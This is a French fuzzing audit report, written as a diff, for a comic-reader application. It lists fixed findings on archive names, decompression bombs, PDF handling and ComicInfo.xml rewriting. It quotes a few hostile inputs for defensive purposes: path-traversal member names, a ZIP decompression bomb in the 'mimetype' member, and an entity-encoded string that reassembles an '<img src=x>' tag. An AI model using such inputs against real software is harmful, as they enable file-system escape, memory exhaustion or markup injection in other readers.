+Aucun plantage natif, aucun blocage, aucun processus externe laissé en vie, aucune page perdue en silence sur l'ensemble des campagnes. Suite : 1555 tests au début, puis 1569, 1587, 1588, 1597 et **1602** à la fin, tous passés (les nombres comptent les cas d'un test paramétré).
+
+## Campagnes
+
+| Étape | Cibles | Durée cumulée | Entrées | Limites |
+|---|---|---|---|---|
+| 1 — noms et chemins | `contained_member_name`, `safe_join`, `_flat_names` + `_unique_flat_name`, export réel sur NTFS (`windows_safe_relpath` + `unique_names` + `safe_join`), `cbz_members`, `zip_member_name`, `tar_entry_name` (noms et octets TAR quelconques), `log_text`, `name_for_real_format`, `name_incoming_comic_infos` | ~3 min 45 (2 passages de 105 et 120 s) | ~3,6 millions | noms seuls, pas de fichiers |
+| 2 — fichiers malformés | images (create_entry, affichage, réenregistrement) ; CBZ et EPUB (détection, liste, ordre EPUB, lecture des pages) ; CBT ; CB7 (7z.exe) ; CBR (RAR 4 stockés) ; bombes de décompression | ~16 min | ~115 000 | RAR : pas d'outil pour créer des archives compressées ou RAR 5 ; CB7 : 3 niveaux de compression |
+| 3 — PDF, ComicInfo.xml, enchaînements | moteur PDF réel (rendu, images brutes, fusion, lot, préouverture) et `PdfProbe` ; lecture et réécriture de ComicInfo.xml ; ouverture → enregistrement (`cbz_members`, `converted_cbz.write_cbz` avec relecture) → réouverture | ~22 min, mesures de mémoire comprises | ~3 400 PDF, ~170 000 ComicInfo.xml, ~4 100 enchaînements | PDF générés par PyMuPDF (texte, images JPEG/PNG, rotations, chiffrement propriétaire) |
+
+Le budget initial de 30 minutes a été prolongé par l'utilisateur à l'étape 3 (environ 42 minutes en tout). Les deux outils de campagne restent dans le projet (`fuzz/fuzz_names.py`, `fuzz/fuzz_files.py`, graine aléatoire, durée réglable, rapport dans `%TEMP%`), hors de la suite de tests ; une version courte de chaque contrôle, à graine fixe, fait partie de la suite (`tests/test_fuzz_names.py`, `tests/test_fuzz_files.py`).
+
+## Constats
+
+### F-1 · Lettre de lecteur laissée en tête d'un nom de membre du CBZ produit par l'import de métadonnées en lot
+
+- **Priorité** : P1 · **Certitude** : Confirmed (fuzzing, `HEAD` en échec) · **Statut** : Corrigé.
+- **Code** : `archive_names.py` → `contained_member_name`.
+- **Constat** : `C:C:/x.jpg`, `/C:/D:/x.jpg` ou `/c:` donnaient `C:/x.jpg` : un chemin absolu écrit dans le CBZ, qu'un autre lecteur de BD extrairait hors du dossier de la BD. Le résultat changeait aussi d'un second passage à l'autre.
+- **Correction** : lettre de lecteur retirée tant que le premier segment restant en commence par une.
+
+### F-2 · CBT aux noms qui ne sont pas en UTF-8 : ni enregistrable en CBZ ni convertible
+
+- **Priorité** : P2 (aucune perte : erreur signalée, original gardé) · **Certitude** : Confirmed (vrai lot sur un CBT latin-1, vérifié par l'utilisateur dans l'application) · **Statut** : Corrigé.
+- **Code** : `archive_names.py` → `tar_entry_name` ; `batch_metadata_dialog_qt.py` → `_save_state_for_file` (branche CBT).
+- **Constat** : `tarfile` lit ces noms en UTF-8 avec `surrogateescape` ; les demi-caractères obtenus (`\udcXX`) s'affichaient abîmés et `zipfile` refusait de les écrire.
+- **Correction** : octets d'origine relus en cp1252, ou en latin-1 à défaut ; la branche CBT de l'import de métadonnées passe aussi par `tar_entry_name`.
+
+### F-3 · Membres nommés « .. », « . » ou sans nom dans les CBZ des lots CBR, CB7, CBT
+
+- **Priorité** : P2/P3 · **Certitude** : Confirmed · **Statut** : Corrigé.
+- **Code** : `batch_dialogs_qt.py` → `_flat_names`, `_unique_flat_name`.
+- **Constat** : un membre `x/..` devenait une entrée ZIP `..` ; `C:` une entrée sans nom (`os.path.basename` lit « C: » comme un lecteur).
+- **Correction** : segments vides, `.` et `..` retirés, `_` à la place d'un nom vide.
+
+### F-4 · Préfixe « /./ » d'un nom TAR retiré à moitié
+
+- **Priorité** : P3 · **Certitude** : Confirmed · **Statut** : Corrigé (`tar_entry_name` : préfixes retirés dans n'importe quel ordre).
+
+### F-5 · Bombe de décompression dans le membre « mimetype » d'un ZIP
+
+- **Priorité** : P1 · **Certitude** : Confirmed (bombe réelle de 1,5 Mo lue sous limite de mémoire) · **Statut** : Corrigé.
+- **Code** : `archive_type_detector.py` → `detect_archive_type`, appelée à chaque ouverture et pour chaque fichier d'un lot.
+- **Constat** : `zf.read('mimetype')`, sans contrôle de taille et par nom : un CBZ de 1,5 Mo a fait monter le process à 839 Mo avant la limite (environ 3 Go sans elle), sans plafond avec ZIP64 ; la `MemoryError` était rattrapée en silence.
+- **Correction** : quelques octets lus, par le `ZipInfo` du premier membre de ce nom.
+
+### F-6 · Même bombe dans les documents d'un EPUB
+
+- **Priorité** : P1 · **Certitude** : Confirmed (même bombe) · **Statut** : Corrigé.
+- **Code** : `archive_names.py` → `epub_reading_order` (`container.xml`, OPF, documents de la « spine »).
+- **Correction** : contrôle de `MAX_MEMBER_SIZE` avant lecture ; refusé, l'ordre des noms prend le relais.
+
+### F-7 · Lectures sans limite de taille dans la Bibliothèque
+
+- **Priorité** : P1/P2 · **Certitude** : Confirmed par lecture du code (inventaire de toutes les lectures de membres ; la Bibliothèque importe Qt et n'a pas été soumise au fuzzing) · **Statut** : Corrigé.
+- **Code** : `library_window.py` → `_PreviewWorker.run` (couverture EPUB : `container.xml`, OPF), `LibraryWindow._rewrite_comicinfo_in_cbz` (recopie des autres membres).
+- **Correction** : `archive_loader._check_member_size` avant chaque lecture. Test : `test_library_file_writes.py` (`test_member_too_large_keeps_the_original`, fixture complétée de la vraie fonction de taille). La couverture EPUB n'a pas de test.
+
+### F-8 · Résolution NaN ou infinie : page affichée, toute retouche en échec
+
+- **Priorité** : P2 · **Certitude** : Confirmed · **Statut** : Corrigé (`entries.py` → `image_dpi` : valeur non finie = absence de résolution ; `round` levait `ValueError` dans `page_dpi`).
+
+### F-9 · Archive abîmée écrite dans le journal des erreurs
+
+- **Priorité** : P3 · **Certitude** : Confirmed · **Statut** : Corrigé.
+- **Code** : `error_log.py` → `is_expected_error`.
+- **Constat** : zipfile signale aussi des données abîmées par des exceptions de Python (`zlib.error`, `LZMAError`, `NotImplementedError`, `RuntimeError` « chiffré », `UnicodeDecodeError` d'un nom d'en-tête), classées « inattendues ».
+- **Correction** : `_raised_by_reader_library` — exception levée dans le code d'une bibliothèque de lecture (dernier niveau Python de sa pile), sauf `TypeError`, `AttributeError`, `NameError`, `KeyError` (appel incorrect du programme).
+
+### F-10 · ComicInfo.xml réécrit illisible
+
+- **Priorité** : P0 (perte de toutes les métadonnées de la BD pour MosaicView et les autres lecteurs ; annoncé P1 dans le rapport de l'étape 3, reclassé selon les conventions de ce fichier) · **Certitude** : Confirmed (cas isolés puis fuzzing, `HEAD` en échec) · **Statut** : Corrigé.
+- **Code** : `comic_info.py` → `_serialize_comic_xml` (éditeur, import ComicVine, synchronisation de `<Pages>` et du nombre de pages).
+- **Constat** : la balise `<ComicInfo …>` d'origine était recopiée par l'expression `<ComicInfo[^>]*>` puis décodée en UTF-8 : un ComicInfo.xml vide (`<ComicInfo/>`, que certains outils créent), un `>` dans un attribut ou un `<ComicInfo` dans un commentaire placé avant donnaient un fichier illisible ; un attribut latin-1 faisait échouer la réécriture.
+- **Correction** : `_comic_info_open_tag` relit la balise par `expat` et la réécrit attribut par attribut ; balises `xmlns` usuelles reproduites à l'identique.
+
+### F-11 · CBT compressé abîmé écrit dans le journal des erreurs
+
+- **Priorité** : P3 · **Certitude** : Confirmed (enchaînements) · **Statut** : Corrigé (`gzip`, `bz2`, `lzma`, `_compression` ajoutés à `_EXPECTED_MODULES` : la décompression d'un CBT est faite par eux pour tarfile).
+
+### Risques résiduels traités à la demande de l'utilisateur
+
+- **R-1 · GIF plus grand que son format** (P3, Corrigé) : 97 octets annonçant 65 559 pixels de large (Pillow compose la taille à partir de la position de l'image incluse) ; affiché, il ne pouvait plus être retouché. `entries.create_entry` en fait une page illisible avant tout décodage (`image_ops.FORMAT_MAX_SIZE["GIF"]`). Règle limitée au GIF, dont c'est le maximum absolu.
+- **R-2 · Moteur PDF qui grossit pendant un long lot** (P3, Corrigé) : environ 0,1 Mo par PDF (400 PDF sains : 203 → 248 Mo), sans limite sur un lot de milliers de fichiers ; la même boucle dans un seul process ne grossit pas (1 200 PDF : 204 → 206 Mo) : la croissance tient à l'échange entre process, cause exacte non isolée. `batch_dialogs_qt.py` → `_run_pdf_conversion` remplace le moteur entre deux fichiers tous les `_PDF_FILES_PER_ENGINE` (200) PDF.
+- **R-3 · Réécriture de ComicInfo.xml qui change le fichier à chaque enregistrement** (P3, Corrigé) : une balise qui mêle texte et sous-balises recevait de nouveaux blancs (écrite désormais à l'identique sur une ligne, `_inline_xml`) ; un retour chariot était relu comme un saut de ligne (écrit `&#13;`). Toute réécriture d'un fichier déjà réécrit donne les mêmes octets (61 300 documents, aucun écart).
+- **R-4 · Noms qu'UTF-8 ne peut pas porter** (P3, Corrigé) : `expat` accepte dans un fichier UTF-16 ou ISO-8859-1 des noms (« µ… ») qu'il refuse en UTF-8. Seuls cette balise ou cet attribut étranger sont omis (`_writable_name`) ; la solution d'abord proposée (garder l'ancien fichier) aurait fait perdre la modification de l'utilisateur dans l'éditeur et l'import ComicVine.
+- **R-5 · Caractère de contrôle dans un texte** (P0 par son effet, Corrigé ; trouvé en écrivant le dernier filet de R-4) : un `\x0b` d'une description ComicVine ou d'un collage rendait le ComicInfo.xml illisible. Les caractères que XML ne peut pas contenir sont retirés ; en dernier filet, le XML produit est relu avant d'être rendu, et une erreur est levée plutôt que d'écrire un fichier illisible.
+
+### Non corrigés, par décision de l'utilisateur
+
+- **Q-1 · Image minuscule qui annonce une taille énorme** (P3) : un BMP ou un TIFF de 1 Ko annonçant jusqu'à 500 millions de pixels fait réserver 1,2 à 2 Go le temps du décodage, puis la page devient illisible ; aucun plantage. Conséquence directe de la limite de pixels du projet ; une parade (refuser un format non compressé bien plus petit que ses pixels) risquait de refuser de vraies images.
+- **Q-2 · Compromis de `_raised_by_reader_library`** (P3) : une `ValueError` levée par zipfile à cause d'un mauvais appel du programme serait classée attendue (message à l'écran, mais pas de pile dans le journal). Une liste exacte des messages serait plus stricte mais fragile face aux versions de Python.
+
+## Fausses pistes écartées
+
+- Collisions de casse Unicode (`ſ`/`s`, `ς`/`σ`, `ı`/`i`, `µ`/`μ`) dans `unique_names` : NTFS ne les confond pas (vérifié par écriture réelle).
+- `.. ` et `...` normalisés en `..` par Windows : jamais.
+- Programmes 7z ou UnRAR « encore en vie » : délai de comptage de Windows ; aucun après 3 s d'attente.
+- Page lue plus petite que sa taille annoncée : membre stocké dont seule la taille annoncée est fausse, CRC juste, octets complets.
+- `name_for_real_format` avec une barre oblique inverse : un nom de page n'en contient jamais.
+- Artefacts du harnais, corrigés dans les outils : fichier gardé qui n'était pas l'entrée en cause (copie faite après coup), pages refusées à l'affichage par la seule limite de 1 Go du harnais, différences d'une réécriture de ComicInfo.xml dues à une racine renommée par mutation ou au contenu de `<Pages>` (régénéré par MosaicView).
+
+## Faits vérifiés et conclusions
+
+- **Vérifié** : chaque constat corrigé a un test qui échoue sur la copie de `HEAD` et passe après correction (hors F-7 couverture EPUB, sans test, et R-2, dont le test exécute la vraie boucle du lot avec un moteur scripté) ; la suite complète (1602 tests) est passée chez l'utilisateur ; le CBT latin-1 de F-2 a été ouvert et enregistré par l'utilisateur dans l'application.
+- **Conclusion, non démontrée** : l'absence de plantage natif et de blocage sur ces campagnes ne prouve pas leur absence ; les mutations aveugles explorent mal les structures compressées profondes (flux deflate, LZMA, objets PDF compressés).
+
+## Zones non testées
+
+- Tout ce qui demande Qt : fenêtres (Bibliothèque, éditeur ComicInfo, visionneuse, outils d'image), presse-papiers, glisser-déposer, enchaînements complets de l'application (seules leurs fonctions de lecture et d'écriture ont été exercées).
+- RAR compressés et RAR 5 (aucun outil pour les créer), relecture par UnRAR en dehors du cas « somme de contrôle fausse » ; EPUB au-delà d'un modèle minimal ; PDF chiffrés par mot de passe utilisateur au-delà du refus, copie déverrouillée (`PdfProbe`, commande `unlock`).
+- Réseau (ComicVine, import web), numérisation WIA, partages réseau, chemins de plus de 260 caractères, plusieurs instances simultanées.
+
+## Tests ajoutés
+
+| Fichier | Tests | Invariant |
+|---|---|---|
+| `test_fuzz_names.py` (nouveau) | 5 | Fuzzing à graine fixe des noms : dossier d'extraction jamais quitté, noms de lots écrivables et distincts, export réel sur NTFS sans écrasement, noms TAR quelconques écrivables dans un ZIP, journal d'une seule ligne |
+| `test_untrusted_names.py`, `test_archive_member_reading.py`, `test_batch_unique_flat_name.py`, `test_batch_loops.py` | 9 | F-1 à F-4 ; vrai lot CBT latin-1 |
+| `test_fuzz_files.py` (nouveau) | 20 | F-5, F-6, F-8, F-9, F-11, R-1 ; fuzzing à graine fixe des images, CBZ, CBT et de la réécriture de ComicInfo.xml (image annonçant plus de 4 millions de pixels écartée avant décodage) |
+| `test_library_file_writes.py` | 1 | F-7 (réécriture de ComicInfo.xml de la Bibliothèque) |
+| `test_comic_info.py` | 11 | F-10, R-3, R-4, R-5 |
+| `test_batch_loops.py`, `test_error_reporting.py` | 1 (+1 espace de noms complété) | R-2 |
+
+## Autres fichiers modifiés
+
+`CHANGELOG.md` (puces CBT, sécurité, métadonnées, lot PDF ; puce « Tests » complétée par le fuzzing et les corrections invisibles à l'usage) ; `CLAUDE.md` (nombre de tests ; règle du CHANGELOG reformulée à la demande de l'utilisateur : les changements internes importants y sont décrits) ; `RELEASE.txt` (nombre de tests) ; outils `fuzz/fuzz_names.py` et `fuzz/fuzz_files.py` (nouveaux, à la racine) ; skills `archive-image-loading`, `batch-processing`, `batch-metadata-import`, `library`, `config-storage`, `comicinfo-metadata-editor`, `batch-pdf-convert`. Écart signalé : `archive-image-loading` et `CLAUDE.md` affirmaient que toute lecture de membre contrôlait sa taille ; le détecteur de type, l'ordre EPUB et deux lectures de la Bibliothèque faisaient exception (F-5 à F-7).
+
+## Complément — fonctions qui reçoivent un texte externe
+
+Les quatre fonctions de la table « Fuzzing utile » de l'Audit 6 qui n'avaient que des tests à cas fixés ont été ajoutées à `fuzz/fuzz_names.py` (12 cibles), avec leur version courte dans `tests/test_fuzz_names.py` (4 tests) :
+
+| Cible | Invariant | Résultat |
+|---|---|---|
+| `tabs_qt._page_attr_int` | jamais d'exception, toujours un entier | tenu (`١٢` et `1_000` acceptés par `int()`, sans conséquence pour une valeur de tri) |
+| `web_import_qt.extract_images_from_js_loops` | moins de 3 s par page, adresses http(s) distinctes, au plus `_MAX_EXTRACTED_URLS` | F-12 |
+| `comicvine_scraper._strip_html` | aucune balise ni commentaire en sortie | F-13 |
+| `open_with_default_app_qt.openable_temp_name` | extension de la liste blanche, à la lecture du nom et une fois écrit sur NTFS | tenu |
+
+Les deux constats ont été trouvés par des cas faits à la main avant la campagne ; les générateurs les retrouvent sur `HEAD` (273 descriptions sur 1500 avec une balise en sortie ; durée de plus de 3 s dès la 23ᵉ page). Campagnes de 5 s par cible, deux graines : aucun échec après correction. Suite complète passée chez l'utilisateur après les corrections (1619 tests), import Web vérifié dans l'application.
+
+### F-12 · Import Web : durée sans limite sur une page hostile
+
+- **Priorité** : P1 · **Certitude** : Confirmed (mesures, `HEAD`) · **Statut** : Corrigé.
+- **Code** : `web_import_qt.py` → `extract_images_from_js_loops`, `_find_matching_brace`.
+- **Constat** : la limite d'adresses ne comptait que les adresses nouvelles. Une boucle qui affecte toujours la même adresse faisait tout le travail (50 expressions identiques × 5 000 tours : 4 s, croissance linéaire, multipliée par les 200 boucles admises) ; sans accolade fermante, le corps de chaque boucle allait jusqu'à la fin de la page (20 boucles sur 1 Mo : 4,8 s ; 200 boucles sur 20 Mo : un quart d'heure environ).
+- **Correction** : corps lu sur `_MAX_JS_LOOP_BODY` caractères au plus ; budget de `_MAX_JS_EVALUATIONS` évaluations par page (chaque expression examinée et chaque tour). Les deux cas : moins d'une seconde.
+
+### F-13 · Description ComicVine : balise recollée par son propre retrait
+
+- **Priorité** : P1 · **Certitude** : Confirmed · **Statut** : Corrigé.
+- **Code** : `comicvine_scraper.py` → `_strip_html`.
+- **Constat** : `&lt;&lt;b&gt;img src=x&gt;` décodé en `<<b>img src=x>` ; le retrait unique de `<b>` laissait `<img src=x>` dans le Summary de ComicInfo.xml, rendu en HTML par d'autres lecteurs. Les commentaires écrits en entités ressortaient aussi.
+- **Correction** : retrait répété (10 passes au plus, `_TAG_RE`, commentaires et `<?…?>` compris), puis suppression de toute suite de `<` qui ouvrirait encore une balise. Non traité, par choix : une balise sans `>` final.
+
+### F-14 · Ouverture avec l'application par défaut d'un fichier au chemin très profond
+
+- **Priorité** : P3 · **Certitude** : Confirmed (`RecursionError` dans le harnais, puis `HEAD` en échec) · **Statut** : Corrigé.
+- **Code** : `open_with_default_app_qt.py` → `open_file_with_default_app`.
+- **Constat** : les dossiers et le fichier temporaires étaient créés sans rattraper d'erreur, et l'appelant (`PanelWidget`, double-clic) non plus : un chemin trop long pour Windows (`OSError`) ou de milliers de dossiers (`RecursionError` d'`os.makedirs`) faisait échouer le double-clic sans message (erreur au journal seulement).
+- **Correction** : création et écriture dans un `try` qui affiche `_warn_unsafe_path` (message existant, « emplacement non valide ») ; test `test_open_with_warns_when_the_path_cannot_be_written` (`tests/test_untrusted_names.py`).
+- **Même cause, relevé ensuite** : `os.startfile` non rattrapé non plus — un type de la liste blanche sans application associée (erreur Windows 1155) faisait échouer le double-clic sans message. Corrigé : choix d'application de Windows (`openas`), comme l'Explorateur ; autre refus ou échec d'`openas` → `_warn_open_failed` (clé `messages.warnings.default_app_open_failed`, ajoutée aux 46 locales et vérifiée par `verify-translation`) ; deux tests dans `tests/test_untrusted_names.py`.
